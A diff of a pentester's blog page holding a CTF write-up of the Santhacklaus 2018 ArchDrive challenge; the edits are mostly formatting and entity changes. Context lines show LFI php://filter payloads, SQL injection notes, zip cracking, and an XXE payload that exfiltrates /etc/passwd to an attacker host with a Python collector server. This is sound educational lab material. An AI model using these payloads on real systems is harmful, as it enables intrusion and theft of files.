@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.62.0" />
+<meta name="generator" content="Hugo 0.72.0" />
 
   <meta property="og:title" content="[CTF - Santhacklaus-2018] ArchDrive" />
 <meta property="og:description" content="" />
@@ -37,6 +37,7 @@
   <link href="//use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet">
   <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
   <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
@@ -105,17 +106,17 @@
     <h1 class="brand-title">Thibaud Robin</h1>
     <h2 class="brand-tagline">Alias Th1b4ud</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity, technology and much more !</p>
+    <p>Personnal blog to speak about cybersecurity and Root-Me FAQ</p>
 
     <nav class="nav">
       <ul class="nav-list">
-        <li class="nav-item"><span class="nav-item-separator">//</span><a href="/">Home</a></li>
+        <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/">Home</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/whoami">WHOAMI</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/whoami">WHOAMI</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/writeups">WRITEUPS</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/writeups">WRITEUPS</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/articles">ARTICLES</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/articles">ARTICLES</a></li>
         
       </ul>
     </nav>
@@ -167,7 +168,7 @@
     <li><a href="#2nd-step---ho--nice-holidays-pictures-">2nd step - Ho ! Nice holidays pictures :)</a></li>
     <li><a href="#3rd-step---do-you-know-veracrypt-">3rd step - Do you know VeraCrypt ?</a></li>
     <li><a href="#4th-step---dive-in-blackhat-underground">4th step - Dive in BlackHat underground</a></li>
-    <li><a href="#5th-step---lets-escalate-">5th step - Let's escalate !</a></li>
+    <li><a href="#5th-step---lets-escalate-">5th step - Let&rsquo;s escalate !</a></li>
     <li><a href="#conclusion">Conclusion</a></li>
   </ul>
 </nav>
@@ -216,9 +217,9 @@
 
 			
 
-            <p>ArchDrive is the biggest challenge of the Santhacklaus 2018 CTF and my favorite one. It's divided in 5 steps of increasing difficulty. The challenge is not really hard, but particularly long and time-consuming. You need to have some strong skills in web pentesting, some basic skills in forensic and medium skills in Linux system.</p>
+            <p>ArchDrive is the biggest challenge of the Santhacklaus 2018 CTF and my favorite one. It&rsquo;s divided in 5 steps of increasing difficulty. The challenge is not really hard, but particularly long and time-consuming. You need to have some strong skills in web pentesting, some basic skills in forensic and medium skills in Linux system.</p>
 <p><img src="/img/santhacklaus/arch1.png" alt="" title=""></p>
-<p>So, as you can see, the 5 steps have their own validation password (flag). Let's start the challenge !</p>
+<p>So, as you can see, the 5 steps have their own validation password (flag). Let&rsquo;s start the challenge !</p>
 <h2 id="1st-step---develop-as-in-2003">1st step - Develop as in 2003</h2>
 <p><img src="/img/santhacklaus/arch2.png" alt="" title=""></p>
 <p>Here is our target : <a href="https://archdrive.santhacklaus.xyz/">https://archdrive.santhacklaus.xyz/</a></p>
@@ -226,7 +227,7 @@
 <p>First thing to do is to understand the application. <strong>What is it ? What is doing ? What can be exploited ?</strong></p>
 <p>Referer to the challenge description, this application has a web storage functionnality. Here is the login page to access to your personnal storage. Is there any kind of &ldquo;I forgot my password&rdquo; page ?</p>
 <p><img src="/img/santhacklaus/arch4.png" alt="" title=""></p>
-<p>Ok, the forgot password page is not really usefull. You can't enumerate some account, there is always the same message : <code>Email sent !</code>. But look further ! Look at the url and specifically to the arguments page. Look familiar to a vulnerability : Local File Inclusion. What it is a LFI ? Look at OWASP description : <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion</a></p>
+<p>Ok, the forgot password page is not really usefull. You can&rsquo;t enumerate some account, there is always the same message : <code>Email sent !</code>. But look further ! Look at the url and specifically to the arguments page. Look familiar to a vulnerability : Local File Inclusion. What it is a LFI ? Look at OWASP description : <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion</a></p>
 <p><code>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &quot;dynamic file inclusion&quot; mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</code></p>
 <p>There is below a vulnerable code to LFI. It’s really easy to prevent this type of vulnerability by adding some permissions checks before including the file.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
@@ -237,11 +238,11 @@
 <p>It works ! Congratz dude ! Look carefully to the last line. There is some great informations :</p>
 <ul>
 <li>We see an username (maybe the administrator quote in challenge description) with possibility to log on the server (with /bin/bash) : <code>G0lD3N_Us3r</code></li>
-<li>We've got the flag of the first step : <code>IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}</code></li>
+<li>We&rsquo;ve got the flag of the first step : <code>IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}</code></li>
 </ul>
 <h2 id="2nd-step---ho--nice-holidays-pictures-">2nd step - Ho ! Nice holidays pictures :)</h2>
 <p><img src="/img/santhacklaus/arch6.png" alt="" title=""></p>
-<p>We've got a nice LFI. What can we do with LFI ? Execute some code, read some files and many more&hellip; I'm a curious guy. I always want to know how developers made their applications. When you read the source code of <code>index.php</code>, you discover two others php pages : <code>login.php</code> and <code>reset.php</code>. So let's obtain all the source code !</p>
+<p>We&rsquo;ve got a nice LFI. What can we do with LFI ? Execute some code, read some files and many more&hellip; I&rsquo;m a curious guy. I always want to know how developers made their applications. When you read the source code of <code>index.php</code>, you discover two others php pages : <code>login.php</code> and <code>reset.php</code>. So let&rsquo;s obtain all the source code !</p>
 <p>I can recommend you the Swissky CheatSheets : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>. Scroll to File Inclusion section : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal</a></p>
 <p>On this sheet, you have all you need to exploit a LFI. How can I extract the application source code ? With php wrappers of course ! Some examples :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
@@ -257,7 +258,7 @@ http://example.com/index.php?page=php://filter/bzip2.compress/convert.base64-enc
 </div>
 <p>Let extract the source code of the famous page : <code>reset.php</code> : <a href="https://archdrive.santhacklaus.xyz/index.php?page=php://filter/bzip2.compress/convert.base64-encode/resource=reset.php">https://archdrive.santhacklaus.xyz/index.php?page=php://filter/bzip2.compress/convert.base64-encode/resource=reset.php</a></p>
 <p><img src="/img/santhacklaus/arch7.png" alt="" title=""></p>
-<p>Well done ! This the base64 code of the <code>reset.php</code> page. Let's decode this. As you can see, the data is not compressed (maybe file is too light) so you juste have to decode it.</p>
+<p>Well done ! This the base64 code of the <code>reset.php</code> page. Let&rsquo;s decode this. As you can see, the data is not compressed (maybe file is too light) so you juste have to decode it.</p>
 <p><img src="/img/santhacklaus/arch8.png" alt="" title=""></p>
 <p>We have some PHP code, sounds great !</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;?php session_start(); ?&gt;</span>
@@ -364,10 +365,10 @@ $state <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</spa
 <p>If you look closer to the code, you see a huge mistake. Look at this 2 lines :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$user = mysqli_real_escape_string($bdd, strtolower($_POST[&#39;email&#39;]));
 $pass = $_POST[&#39;pass&#39;];
-</code></pre></div><p>The developper sanitize the <code>$user</code> variable but forgot to sanitize the <code>$pass</code> variable. Too bad, suddenly it's possible to do some sql injection on the field password in the login form. But if you read the source code, you must have the good username. When you watch carefully the html code of <code>reset.php</code> you can clearly read <code>Email (only from @archdrive.corp)</code>. So we can guess a correct email could be <code>g0ld3n_us3r@archdrive.corp</code> (referer to the /etc/passwd file). So let's try this !</p>
+</code></pre></div><p>The developper sanitize the <code>$user</code> variable but forgot to sanitize the <code>$pass</code> variable. Too bad, suddenly it&rsquo;s possible to do some sql injection on the field password in the login form. But if you read the source code, you must have the good username. When you watch carefully the html code of <code>reset.php</code> you can clearly read <code>Email (only from @archdrive.corp)</code>. So we can guess a correct email could be <code>g0ld3n_us3r@archdrive.corp</code> (referer to the /etc/passwd file). So let&rsquo;s try this !</p>
 <p><img src="/img/santhacklaus/arch9.png" alt="" title="">
 <img src="/img/santhacklaus/arch10.png" alt="" title=""></p>
-<p>Wonderful ! We are logged in ! But for people (like me) who don't like guessing, you can have the account credentials with the help of Sqlmap.</p>
+<p>Wonderful ! We are logged in ! But for people (like me) who don&rsquo;t like guessing, you can have the account credentials with the help of Sqlmap.</p>
 <div class="alert danger">
     <i class="logo fas fa-skull-crossbones"></i>
     <p class="text"><strong>Danger</strong> : Sqlmap is a real dangerous tool for weak application. You can easily DOS it with a --risk and --level too high. Set a delay in your command argument (ex : --delay 5 -&gt; 5s of delay between each request) when you are not sure. 
@@ -427,7 +428,7 @@ Archive:  recup.zip
       377  2018-12-20 11:23   password.txt
 ---------                     -------
       377                     1 file
-</code></pre><p>Maybe the archive password is weak ? Try to break it with bruteforce attack with fcrackzip. Don't forget -u !</p>
+</code></pre><p>Maybe the archive password is weak ? Try to break it with bruteforce attack with fcrackzip. Don&rsquo;t forget -u !</p>
 <pre><code>[th1b4ud@th1b4ud-pc ~]$ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip 
 found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)
 
@@ -503,7 +504,7 @@ Gourd-crown2-gao4-warp2 - Take On Me
     |-- System\ Volume\ Information
     |   `-- WPSettings.dat
     `-- UsefulnessHarpers.pdf
-</code></pre><p>And is now that many huge challengers were blocked. We've got many files but we don't know how deal with them. But look carefully. There is a file with the name <code>a.ha_-_TakeOnMe.mp3</code> in the <code>media</code> disk like the second VeraCrypt password in <code>password.txt</code>. Save it ! It could be usefull.</p>
+</code></pre><p>And is now that many huge challengers were blocked. We&rsquo;ve got many files but we don&rsquo;t know how deal with them. But look carefully. There is a file with the name <code>a.ha_-_TakeOnMe.mp3</code> in the <code>media</code> disk like the second VeraCrypt password in <code>password.txt</code>. Save it ! It could be usefull.</p>
 <p>The anwser appeared to me after several hours of research. I was thinking about a way to hide data with VeraCrypt. A button look strange for me : <code>Keyfile</code> button. So i Google my question : <code>veracrypt keyfile</code>, and click on the first link : <a href="https://www.veracrypt.fr/en/Keyfiles%20in%20VeraCrypt.html">https://www.veracrypt.fr/en/Keyfiles%20in%20VeraCrypt.html</a></p>
 <p>I just read the first sentence and got an illumination :</p>
 <p><code>Keyfile is a file whose content is combined with a password (for information on the method used to combine a keyfile with password, see the section Keyfiles in the chapter Technical Details). Until the correct keyfile is provided, no volume that uses the keyfile can be mounted.</code></p>
@@ -543,13 +544,13 @@ Thank you for your purchase !
 
 --- scgz54b2lftqkkvn.onion ---
 </code></pre></div><p>And this is the content of ticket.xml</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;number</span><span style="color:#f92672">&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
-    <span style="color:#f92672">&lt;status</span><span style="color:#f92672">&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
-    <span style="color:#f92672">&lt;date</span><span style="color:#f92672">&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
-    <span style="color:#f92672">&lt;type</span><span style="color:#f92672">&gt;</span>premium<span style="color:#f92672">&lt;/date&gt;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket&gt;</span>
+    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
+    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
+    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
+    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/date&gt;</span>
 <span style="color:#f92672">&lt;/ticket&gt;</span>
-</code></pre></div><p>In <code>README.md</code> you've got a link to website in .onion. Fire Tor and navigate to this url</p>
+</code></pre></div><p>In <code>README.md</code> you&rsquo;ve got a link to website in .onion. Fire Tor and navigate to this url</p>
 <p><img src="/img/santhacklaus/arch15.png" alt="" title=""></p>
 <p>Huuuu ! Nice blackhat theme ! This website is for real hacker !
 The website is really simple. There is 2 pages :</p>
@@ -558,14 +559,14 @@ The website is really simple. There is 2 pages :</p>
 <li><code>play.php</code> where you can play if you already have a ticket.</li>
 </ul>
 <p><img src="/img/santhacklaus/arch16.png" alt="" title=""></p>
-<p>This a game for us ! For blackhat like us ! Let's play the game and send our ticket.</p>
+<p>This a game for us ! For blackhat like us ! Let&rsquo;s play the game and send our ticket.</p>
 <p><img src="/img/santhacklaus/arch17.png" alt="" title=""></p>
 <p>Humm. Yep ! There is a mistake is our xml. This is better</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;number</span><span style="color:#f92672">&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
-    <span style="color:#f92672">&lt;status</span><span style="color:#f92672">&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
-    <span style="color:#f92672">&lt;date</span><span style="color:#f92672">&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
-    <span style="color:#f92672">&lt;type</span><span style="color:#f92672">&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket&gt;</span>
+    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
+    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
+    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
+    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
 <span style="color:#f92672">&lt;/ticket&gt;</span>
 </code></pre></div><p><img src="/img/santhacklaus/arch18.png" alt="" title=""></p>
 <p>Ho sad ! We lost ! :(
@@ -579,11 +580,11 @@ Stop crying boy. Lets go pwn this illegal lottery to uphold the law.</p>
     %ext;
 ]&gt;
 
-<span style="color:#f92672">&lt;ticket</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;number</span><span style="color:#f92672">&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
-    <span style="color:#f92672">&lt;status</span><span style="color:#f92672">&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
-    <span style="color:#f92672">&lt;date</span><span style="color:#f92672">&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
-    <span style="color:#f92672">&lt;type</span><span style="color:#f92672">&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
+<span style="color:#f92672">&lt;ticket&gt;</span>
+    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
+    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
+    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
+    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
 <span style="color:#f92672">&lt;/ticket&gt;</span>
 </code></pre></div><p>On your server (here <code>12.34.56.78</code>) you just have to launch a listener (netcat, python, apache2, like you want&hellip;). I will choose python because it will be helpull later.</p>
 <pre><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
@@ -601,10 +602,10 @@ Serving HTTP on 0.0.0.0 port 4444 ...
 <li>We send a malicious ticket to the victim</li>
 <li>The victim server will load a malicious file host on attacker server</li>
 <li>The victim server will execute the malicious code</li>
-<li>The victim server will send data collected by the malicious code to attacker's server</li>
+<li>The victim server will send data collected by the malicious code to attacker&rsquo;s server</li>
 </ol>
 <p>Still not clear ? See the example</p>
-<p>Here we have our malicious ticket. When the victim server will read this ticket, it will load the malicous code hosted on attacker's server</p>
+<p>Here we have our malicious ticket. When the victim server will read this ticket, it will load the malicous code hosted on attacker&rsquo;s server</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
 
 <span style="color:#75715e">&lt;!DOCTYPE root [
@@ -614,14 +615,14 @@ Serving HTTP on 0.0.0.0 port 4444 ...
     %param1;
 ]&gt;
 
-<span style="color:#f92672">&lt;ticket</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;number</span><span style="color:#f92672">&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
-    <span style="color:#f92672">&lt;status</span><span style="color:#f92672">&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
-    <span style="color:#f92672">&lt;date</span><span style="color:#f92672">&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
-    <span style="color:#f92672">&lt;type</span><span style="color:#f92672">&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
-    <span style="color:#f92672">&lt;root</span><span style="color:#f92672">&gt;</span>&amp;external;<span style="color:#f92672">&lt;/root&gt;</span>
+<span style="color:#f92672">&lt;ticket&gt;</span>
+    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
+    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
+    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
+    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
+    <span style="color:#f92672">&lt;root&gt;</span>&amp;external;<span style="color:#f92672">&lt;/root&gt;</span>
 <span style="color:#f92672">&lt;/ticket&gt;</span>
-</code></pre></div><p>Here we have our malicious code : <code>exploit.dtd</code>. It will compress, base64 encode and send to the attacker's server the <code>/etc/passwd</code> file</p>
+</code></pre></div><p>Here we have our malicious code : <code>exploit.dtd</code>. It will compress, base64 encode and send to the attacker&rsquo;s server the <code>/etc/passwd</code> file</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % data SYSTEM &#34;php://filter/read=bzip2.compress/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
 <span style="color:#75715e">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;http://12.34.56.78:4444/?data=%data;&#39;&gt;</span>&#34;&gt;
 </code></pre></div><p>And on the attacker’s server we receive the extracted data</p>
@@ -655,7 +656,7 @@ irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/bin/false
-</code></pre><p>Here is a nice python http server to gather our data to automate extraction task. Don't forget to grab a copy of <code>exploit.dtd</code> and <code>ticket.xml</code> (see above).</p>
+</code></pre><p>Here is a nice python http server to gather our data to automate extraction task. Don&rsquo;t forget to grab a copy of <code>exploit.dtd</code> and <code>ticket.xml</code> (see above).</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
 <span style="color:#f92672">from</span> BaseHTTPServer <span style="color:#f92672">import</span> BaseHTTPRequestHandler,HTTPServer
 <span style="color:#f92672">import</span> urlparse<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> os 
@@ -669,12 +670,12 @@ PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span
 	<span style="color:#75715e"># Handler for GET requests</span>
 	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
 		query <span style="color:#f92672">=</span> urlparse<span style="color:#f92672">.</span>urlparse(self<span style="color:#f92672">.</span>path)<span style="color:#f92672">.</span>query
-		file <span style="color:#f92672">=</span> urlparse<span style="color:#f92672">.</span>urlparse(self<span style="color:#f92672">.</span>path)<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>replace(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>)
+		file <span style="color:#f92672">=</span> urlparse<span style="color:#f92672">.</span>urlparse(self<span style="color:#f92672">.</span>path)<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
 		
 		<span style="color:#75715e"># If the victim server load our malicious file -&gt; send it</span>
 		<span style="color:#66d9ef">if</span> file:
 			<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
-				f <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>)
+				f <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#39;r&#39;</span>)
 				self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
 				self<span style="color:#f92672">.</span>end_headers()
 				self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(f<span style="color:#f92672">.</span>read())
@@ -682,26 +683,26 @@ PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span
 			<span style="color:#66d9ef">else</span>:
 				self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">404</span>)
 				self<span style="color:#f92672">.</span>end_headers()
-				self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">404 ERROR : File not found !</span><span style="color:#e6db74">&#34;</span>)
+				self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;404 ERROR : File not found !&#34;</span>)
 		
 		<span style="color:#75715e"># Else if, the victim server send us data -&gt; decode it</span>
 		<span style="color:#66d9ef">else</span>:
-			b64data <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>replace(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">data=</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>)
+			b64data <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;data=&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
 			plaintext <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64data)
-			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">clear</span><span style="color:#e6db74">&#34;</span>)
-			<span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[+] Data received !</span><span style="color:#e6db74">&#34;</span>
+			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;clear&#34;</span>)
+			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Data received !&#34;</span>
 			<span style="color:#66d9ef">print</span> plaintext
 
 <span style="color:#66d9ef">try</span>:
 	<span style="color:#75715e"># Create the web server</span>
-	server <span style="color:#f92672">=</span> HTTPServer((<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>, PORT), Handler)
-	<span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">[*] Listening on port</span><span style="color:#e6db74">&#39;</span> , PORT
+	server <span style="color:#f92672">=</span> HTTPServer((<span style="color:#e6db74">&#39;&#39;</span>, PORT), Handler)
+	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[*] Listening on port&#39;</span> , PORT
 	
 	<span style="color:#75715e"># Wait forever for incoming HTTP requests</span>
 	server<span style="color:#f92672">.</span>serve_forever()
 
 <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
-	<span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[x] Shutting down the web server</span><span style="color:#e6db74">&#39;</span>
+	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[x] Shutting down the web server&#39;</span>
 	server<span style="color:#f92672">.</span>socket<span style="color:#f92672">.</span>close()
 </code></pre></div><p>Demo :</p>
 <p><img src="/img/santhacklaus/archdrive1.gif" alt=""></p>
@@ -776,7 +777,7 @@ LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
    /   <span style="color:#ae81ff">\_</span>_ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
   / /<span style="color:#ae81ff">\ </span>/ _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">&#39;__| |/ /  / /  / _ \| __| __/ _ \ &#39;</span>__| | | |
  / /_// <span style="color:#f92672">(</span>_| | |  |   &lt;  / /__| <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> | |_| <span style="color:#f92672">||</span>  __/ |  | |_| |
-/___,<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">\_</span>_,_|_|  |_|<span style="color:#ae81ff">\_</span><span style="color:#ae81ff">\ </span><span style="color:#ae81ff">\_</span>___/<span style="color:#ae81ff">\_</span>__/ <span style="color:#ae81ff">\_</span>_|<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_|   <span style="color:#ae81ff">\_</span>_, |
+/___,<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">\_</span>_,_|_|  |_|<span style="color:#ae81ff">\_\ \_</span>___/<span style="color:#ae81ff">\_</span>__/ <span style="color:#ae81ff">\_</span>_|<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_|   <span style="color:#ae81ff">\_</span>_, |
                                                       |___/
 Last login: Fri Dec <span style="color:#ae81ff">28</span> 16:58:26 <span style="color:#ae81ff">2018</span> from 81.57.217.252
 
@@ -799,7 +800,7 @@ drwxr-x--- <span style="color:#ae81ff">1</span> root dark_lottery <span style="c
 dark_lottery@9db68003fdde:~$ cat flag.txt 
 IMTLD<span style="color:#f92672">{</span>Wh4t_4_H4rD_ch4lL3nge<span style="color:#f92672">}</span>
 </code></pre></div><p>Yeah ! Only one step is remaining !</p>
-<h2 id="5th-step---lets-escalate-">5th step - Let's escalate !</h2>
+<h2 id="5th-step---lets-escalate-">5th step - Let&rsquo;s escalate !</h2>
 <p><img src="/img/santhacklaus/arch19.png" alt=""></p>
 <p>The description is explicit : &lsquo;finish the work&rsquo; mean &lsquo;obtain root access&rsquo;. Privilege escalation is a huge classic in ctf. And sometimes it can be very difficult. So the first thing to do is to take a cheatsheet to help you.</p>
 <div class="alert protips">
@@ -808,7 +809,7 @@ IMTLD<span style="color:#f92672">{</span>Wh4t_4_H4rD_ch4lL3nge<span style="color
     
     </p>
 </div>
